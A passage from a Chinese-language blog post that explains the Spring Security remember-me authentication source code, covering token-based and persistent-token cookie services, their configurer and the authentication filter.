<span class="hljs-keyword">catch</span> (UnsupportedEncodingException var6) &#123;<br>            <span class="hljs-built_in">this</span>.logger.error(var6.getMessage(), var6);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> tokens;<br>&#125;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loginFail</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>    <span class="hljs-built_in">this</span>.logger.debug(<span class="hljs-string">&quot;Interactive login attempt was unsuccessful.&quot;</span>);<br>    <span class="hljs-built_in">this</span>.cancelCookie(request, response);<br>    <span class="hljs-built_in">this</span>.onLoginFail(request, response);<br>&#125;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onLoginFail</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loginSuccess</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Authentication successfulAuthentication)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.rememberMeRequested(request, <span class="hljs-built_in">this</span>.parameter)) &#123;<br>        <span class="hljs-built_in">this</span>.logger.debug(<span class="hljs-string">&quot;Remember-me login not requested.&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">this</span>.onLoginSuccess(request, response, successfulAuthentication);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> UserDetails <span class="hljs-title function_">processAutoLoginCookie</span><span class="hljs-params">(String[] var1, HttpServletRequest var2, HttpServletResponse var3)</span> <span class="hljs-keyword">throws</span> RememberMeAuthenticationException, UsernameNotFoundException;<br><br></code></pre></td></tr></table></figure><p>主要执行方法autoLogin</p><blockquote><p>首先使用extractRememberMeCookie()方法来获取request中的cookie,如果cookie符合条件则先用decodeCookie进行</p><p>base64解码(如果令牌字符串长度不是4的倍数，则在令牌末尾补上一个或者多个“&#x3D;”，以使其长度变为4的倍数)</p><p>之后执行processAutoLoginCookie()方法这个方法是个抽象方法,在他的子类(PersistentTokenBasedRememberMeServices)里面实现,该方法作用是验证cookie如果符合条件则将用户信息放进去.</p><p>最后调用createSuccessfulAuthentication方法创建token</p></blockquote><p>接下来让我们看看认证失败调用的方法吧~</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loginFail</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>    <span class="hljs-built_in">this</span>.logger.debug(<span class="hljs-string">&quot;Interactive login attempt was unsuccessful.&quot;</span>);<br>    <span class="hljs-built_in">this</span>.cancelCookie(request, response);<br>    <span class="hljs-built_in">this</span>.onLoginFail(request, response);<br>&#125;<br></code></pre></td></tr></table></figure><p>首先取消cookie然后再跳转到onLoginFail()方法&#x3D;&#x3D;默认是个空方法&#x3D;&#x3D;</p><p>如果登录成功则</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loginSuccess</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Authentication successfulAuthentication)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.rememberMeRequested(request, <span class="hljs-built_in">this</span>.parameter)) &#123;<br>        <span class="hljs-built_in">this</span>.logger.debug(<span class="hljs-string">&quot;Remember-me login not requested.&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">this</span>.onLoginSuccess(request, response, successfulAuthentication);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onLoginSuccess</span><span class="hljs-params">(HttpServletRequest var1, HttpServletResponse var2, Authentication var3)</span>;<br></code></pre></td></tr></table></figure><p>登录成功时，会首先调用rememberMeRequested方法，判断当前请求是否开启了自动登录。开发者可以在服务端配置alwaysRemember，这样无论前端参数是什么，都会开启自动登录，如果开发者没有配置alwaysRemember，则根据前端传来的remember-me参数进行判断，remember-me参数的值如果是true、on（默认）、yes或者1，表示开启自动登录。如果开启了自动登录，则调用onLoginSuccess方法进行登录成功的处理。onLoginSuccess是一个抽象方法，具体实现在AbstractRememberMeServices的子类中。</p><p>&#x3D;&#x3D;最后再来看AbstractRememberMeServices中一个比较重要的方法setCookie，在自动登录成功后，将调用该方法把令牌信息放入响应头中并最终返回到前端&#x3D;&#x3D;</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCookie</span><span class="hljs-params">(String[] tokens, <span class="hljs-type">int</span> maxAge, HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cookieValue</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.encodeCookie(tokens);<br>    <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-built_in">this</span>.cookieName, cookieValue);<br>    cookie.setMaxAge(maxAge);<br>    cookie.setPath(<span class="hljs-built_in">this</span>.getCookiePath(request));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.cookieDomain != <span class="hljs-literal">null</span>) &#123;<br>        cookie.setDomain(<span class="hljs-built_in">this</span>.cookieDomain);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (maxAge &lt; <span class="hljs-number">1</span>) &#123;<br>        cookie.setVersion(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    cookie.setSecure(<span class="hljs-built_in">this</span>.useSecureCookie != <span class="hljs-literal">null</span> ? <span class="hljs-built_in">this</span>.useSecureCookie : request.isSecure());<br>    cookie.setHttpOnly(<span class="hljs-literal">true</span>);<br>    response.addCookie(cookie);<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="TokenBasedRememberMeServices"><a href="#TokenBasedRememberMeServices" class="headerlink" title="TokenBasedRememberMeServices"></a>TokenBasedRememberMeServices</h4><p>实现了processAutoLoginCookie方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> UserDetails <span class="hljs-title function_">processAutoLoginCookie</span><span class="hljs-params">(String[] cookieTokens, HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>    <span class="hljs-keyword">if</span> (cookieTokens.length != <span class="hljs-number">3</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidCookieException</span>(<span class="hljs-string">&quot;Cookie token did not contain 3 tokens, but contained &#x27;&quot;</span> + Arrays.asList(cookieTokens) + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">tokenExpiryTime</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getTokenExpiryTime(cookieTokens);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.isTokenExpired(tokenExpiryTime)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidCookieException</span>(<span class="hljs-string">&quot;Cookie token[1] has expired (expired on &#x27;&quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(tokenExpiryTime) + <span class="hljs-string">&quot;&#x27;; current time is &#x27;&quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>() + <span class="hljs-string">&quot;&#x27;)&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">UserDetails</span> <span class="hljs-variable">userDetails</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getUserDetailsService().loadUserByUsername(cookieTokens[<span class="hljs-number">0</span>]);<br>            Assert.notNull(userDetails, () -&gt; &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;UserDetailsService &quot;</span> + <span class="hljs-built_in">this</span>.getUserDetailsService() + <span class="hljs-string">&quot; returned null for username &quot;</span> + cookieTokens[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;. This is an interface contract violation&quot;</span>;<br>            &#125;);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">expectedTokenSignature</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.makeTokenSignature(tokenExpiryTime, userDetails.getUsername(), userDetails.getPassword());<br>            <span class="hljs-keyword">if</span> (!equals(expectedTokenSignature, cookieTokens[<span class="hljs-number">2</span>])) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidCookieException</span>(<span class="hljs-string">&quot;Cookie token[2] contained signature &#x27;&quot;</span> + cookieTokens[<span class="hljs-number">2</span>] + <span class="hljs-string">&quot;&#x27; but expected &#x27;&quot;</span> + expectedTokenSignature + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> userDetails;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>判断cookie长度为3否则报错</p><p>获取cookie中的时间戳查看如果超时则报错</p><p>获取用户名并去数据库查找如果为空则报错</p><p>首先将用户名、令牌过期时间、用户密码以及key组成一个字符串，中间用“:”隔开，然后通过MD5消息摘要算法对该字符串进行加密，并将加密结果转为一个字符串返回。</p><p>然后判断加密的字符串与cookie[2]是否相等不相等报错相等则返回用户对象</p><p>实现方法二:</p><p>onLoginSuccess</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onLoginSuccess</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Authentication successfulAuthentication)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.retrieveUserName(successfulAuthentication);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.retrievePassword(successfulAuthentication);<br>    <span class="hljs-keyword">if</span> (!StringUtils.hasLength(username)) &#123;<br>        <span class="hljs-built_in">this</span>.logger.debug(<span class="hljs-string">&quot;Unable to retrieve username&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (!StringUtils.hasLength(password)) &#123;<br>            <span class="hljs-type">UserDetails</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getUserDetailsService().loadUserByUsername(username);<br>            password = user.getPassword();<br>            <span class="hljs-keyword">if</span> (!StringUtils.hasLength(password)) &#123;<br>                <span class="hljs-built_in">this</span>.logger.debug(<span class="hljs-string">&quot;Unable to obtain password for user: &quot;</span> + username);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">tokenLifetime</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.calculateLoginLifetime(request, successfulAuthentication);<br>        <span class="hljs-type">long</span> <span class="hljs-variable">expiryTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        expiryTime += <span class="hljs-number">1000L</span> * (<span class="hljs-type">long</span>)(tokenLifetime &lt; <span class="hljs-number">0</span> ? <span class="hljs-number">1209600</span> : tokenLifetime);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">signatureValue</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.makeTokenSignature(expiryTime, username, password);<br>        <span class="hljs-built_in">this</span>.setCookie(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;username, Long.toString(expiryTime), signatureValue&#125;, tokenLifetime, request, response);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.logger.isDebugEnabled()) &#123;<br>            <span class="hljs-built_in">this</span>.logger.debug(<span class="hljs-string">&quot;Added remember-me cookie for user &#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27;, expiry: &#x27;&quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(expiryTime) + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先获取用户名和密码,判断用户名和密码是否为空,如果密码为空则用用户名去数据库中获取</p><p>然后生成一个默认两周时间的令牌,然后根据过期时间、用户名、密码和key来生成一个字符串并将所有信息转换为字符串进行加密并使用base64进行编码加密后发送给前端</p><h4 id="PersistentTokenBasedRememberMeServices"><a href="#PersistentTokenBasedRememberMeServices" class="headerlink" title="PersistentTokenBasedRememberMeServices"></a>PersistentTokenBasedRememberMeServices</h4><p>持久化！令牌认证:smirk:</p><p>在持久化令牌中，存储在数据库中的数据被封装成了一个对象PersistentRememberMeToken</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PersistentRememberMeToken</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String username;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String series;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String tokenValue;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Date date;<br>&#125;<br></code></pre></td></tr></table></figure><p>他和TokenBasedRememberMeServices一样重写了processAutoLoginCookie和onLoginSuccess方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> UserDetails <span class="hljs-title function_">processAutoLoginCookie</span><span class="hljs-params">(String[] cookieTokens, HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>    <span class="hljs-keyword">if</span> (cookieTokens.length != <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidCookieException</span>(<span class="hljs-string">&quot;Cookie token did not contain 2 tokens, but contained &#x27;&quot;</span> + Arrays.asList(cookieTokens) + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">presentedSeries</span> <span class="hljs-operator">=</span> cookieTokens[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">String</span> <span class="hljs-variable">presentedToken</span> <span class="hljs-operator">=</span> cookieTokens[<span class="hljs-number">1</span>];<br>        <span class="hljs-type">PersistentRememberMeToken</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.tokenRepository.getTokenForSeries(presentedSeries);<br>        <span class="hljs-keyword">if</span> (token == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RememberMeAuthenticationException</span>(<span class="hljs-string">&quot;No persistent token found for series id: &quot;</span> + presentedSeries);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!presentedToken.equals(token.getTokenValue())) &#123;<br>            <span class="hljs-built_in">this</span>.tokenRepository.removeUserTokens(token.getUsername());<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CookieTheftException</span>(<span class="hljs-built_in">this</span>.messages.getMessage(<span class="hljs-string">&quot;PersistentTokenBasedRememberMeServices.cookieStolen&quot;</span>, <span class="hljs-string">&quot;Invalid remember-me token (Series/token) mismatch. Implies previous cookie theft attack.&quot;</span>));<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (token.getDate().getTime() + (<span class="hljs-type">long</span>)<span class="hljs-built_in">this</span>.getTokenValiditySeconds() * <span class="hljs-number">1000L</span> &lt; System.currentTimeMillis()) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RememberMeAuthenticationException</span>(<span class="hljs-string">&quot;Remember-me login has expired&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">this</span>.logger.debug(LogMessage.format(<span class="hljs-string">&quot;Refreshing persistent login token for user &#x27;%s&#x27;, series &#x27;%s&#x27;&quot;</span>, token.getUsername(), token.getSeries()));<br>            <span class="hljs-type">PersistentRememberMeToken</span> <span class="hljs-variable">newToken</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PersistentRememberMeToken</span>(token.getUsername(), token.getSeries(), <span class="hljs-built_in">this</span>.generateTokenData(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-built_in">this</span>.tokenRepository.updateToken(newToken.getSeries(), newToken.getTokenValue(), newToken.getDate());<br>                <span class="hljs-built_in">this</span>.addCookie(newToken, request, response);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var9) &#123;<br>                <span class="hljs-built_in">this</span>.logger.error(<span class="hljs-string">&quot;Failed to update token: &quot;</span>, var9);<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RememberMeAuthenticationException</span>(<span class="hljs-string">&quot;Autologin failed due to data access problem&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getUserDetailsService().loadUserByUsername(token.getUsername());<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>与TokenBasedRememberMeServices不一样的是该方法从cookie中获取两个值,一个是series另一个为tokene.</p><p>首先从tokenRepository中根据series查找是否存在token如果不存在则报错</p><p>然后进行验证,验证失败则报错</p><p>再然后进行验证是否过期</p><p>都通过后则创建一个newtoken(series和用户名不变,日期为当前日期token重新生成)</p><p>然后更新数据库的series,token,date</p><p>然后将刚刚创建的newtoken放入cookie中</p><p>最后根据用户名查找用户信息并返回</p><p>再来看onLoginSuccess</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onLoginSuccess</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Authentication successfulAuthentication)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> successfulAuthentication.getName();<br>    <span class="hljs-built_in">this</span>.logger.debug(LogMessage.format(<span class="hljs-string">&quot;Creating new persistent login for user %s&quot;</span>, username));<br>    <span class="hljs-type">PersistentRememberMeToken</span> <span class="hljs-variable">persistentToken</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PersistentRememberMeToken</span>(username, <span class="hljs-built_in">this</span>.generateSeriesData(), <span class="hljs-built_in">this</span>.generateTokenData(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-built_in">this</span>.tokenRepository.createNewToken(persistentToken);<br>        <span class="hljs-built_in">this</span>.addCookie(persistentToken, request, response);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception var7) &#123;<br>        <span class="hljs-built_in">this</span>.logger.error(<span class="hljs-string">&quot;Failed to save persistent token &quot;</span>, var7);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>登录成功后，构建一个PersistentRememberMeToken对象，对象中的series和token参数都是随机生成的，然后将生成的对象存入数据库中，再调用addCookie方法添加相关的Cookie信息。</p><p>PersistentTokenBasedRememberMeServices和TokenBasedRememberMeServices还是有一些明显的区别的：前者返回给前端的令牌是将series和token组成的字符串进行Base64编码后返回给前端；后者返回给前端的令牌则是将用户名、过期时间以及签名组成的字符串进行Base64编码后返回给前端。</p><blockquote><p>如果开发者配置了tokenRepository，则获取到的RememberMeServices实例是&#x3D;&#x3D;PersistentTokenBasedRememberMe Services&#x3D;&#x3D;，否则获取到TokenBasedRememberMeServices，即系统通过有没有配置tokenRepository来确定使用哪种类型的RememberMeServices。</p></blockquote><h4 id="从配置文件中来看"><a href="#从配置文件中来看" class="headerlink" title="从配置文件中来看"></a>从配置文件中来看</h4><p>解释不清了上图!!!!!!</p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211019145309554.png" alt="image-20211019145309554"></p><p>看见吗返回的时RememberMeConfigurer</p><p>而这个类的爹是AbstractHttpConfigurer它实现的又是SecurityConfigurer</p><p>在源码中得知该类重写了init方法和config方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(H http)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-built_in">this</span>.validateInput();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getKey();<br>    <span class="hljs-type">RememberMeServices</span> <span class="hljs-variable">rememberMeServices</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getRememberMeServices(http, key);<br>    http.setSharedObject(RememberMeServices.class, rememberMeServices);<br>    LogoutConfigurer&lt;H&gt; logoutConfigurer = (LogoutConfigurer)http.getConfigurer(LogoutConfigurer.class);<br>    <span class="hljs-keyword">if</span> (logoutConfigurer != <span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-built_in">this</span>.logoutHandler != <span class="hljs-literal">null</span>) &#123;<br>        logoutConfigurer.addLogoutHandler(<span class="hljs-built_in">this</span>.logoutHandler);<br>    &#125;<br><br>    <span class="hljs-type">RememberMeAuthenticationProvider</span> <span class="hljs-variable">authenticationProvider</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RememberMeAuthenticationProvider</span>(key);<br>    authenticationProvider = (RememberMeAuthenticationProvider)<span class="hljs-built_in">this</span>.postProcess(authenticationProvider);<br>    http.authenticationProvider(authenticationProvider);<br>    <span class="hljs-built_in">this</span>.initDefaultLoginFilter(http);<br>&#125;<br></code></pre></td></tr></table></figure><p>validateInput方法是用来判断rememberMeServices是否为空和cookie中是否有remember-me字段</p><p>之后会获取key如果没有设置key则会使用UUID</p><blockquote><p>如果开发者使用普通的RememberMe，即没有使用持久化令牌，则建议开发者自行配置该key，因为使用默认的UUID字符串，系统每次重启都会生成新的key，会导致之前下发的remember-me失效。</p></blockquote><p>有了key之后，接下来再去获取RememberMeServices实例，如果开发者配置了tokenRepository，则获取到的RememberMeServices实例是PersistentTokenBasedRememberMe Services，否则获取到TokenBasedRememberMeServices，即系统通过有没有配置tokenRepository来确定使用哪种类型的RememberMeServices。</p><p>之后就会调用RememberMeAuthenticationProvider(key);方法来创建一个认证类主要用来校验key</p><p>再来看config方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(H http)</span> &#123;<br>    <span class="hljs-type">RememberMeAuthenticationFilter</span> <span class="hljs-variable">rememberMeFilter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RememberMeAuthenticationFilter</span>((AuthenticationManager)http.getSharedObject(AuthenticationManager.class), <span class="hljs-built_in">this</span>.rememberMeServices);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.authenticationSuccessHandler != <span class="hljs-literal">null</span>) &#123;<br>        rememberMeFilter.setAuthenticationSuccessHandler(<span class="hljs-built_in">this</span>.authenticationSuccessHandler);<br>    &#125;<br><br>    rememberMeFilter = (RememberMeAuthenticationFilter)<span class="hljs-built_in">this</span>.postProcess(rememberMeFilter);<br>    http.addFilter(rememberMeFilter);<br>&#125;<br></code></pre></td></tr></table></figure><p>configure方法中主要创建了一个RememberMeAuthenticationFilter，创建时传入Remember MeServices实例，最后将创建好的RememberMeAuthenticationFilter加入到过滤器链中。</p><p>然后看看RememberMeAuthenticationFilter的doFilter方法是怎么运行的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>    <span class="hljs-keyword">if</span> (SecurityContextHolder.getContext().getAuthentication() != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-built_in">this</span>.logger.debug(LogMessage.of(() -&gt; &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SecurityContextHolder not populated with remember-me token, as it already contained: &#x27;&quot;</span> + 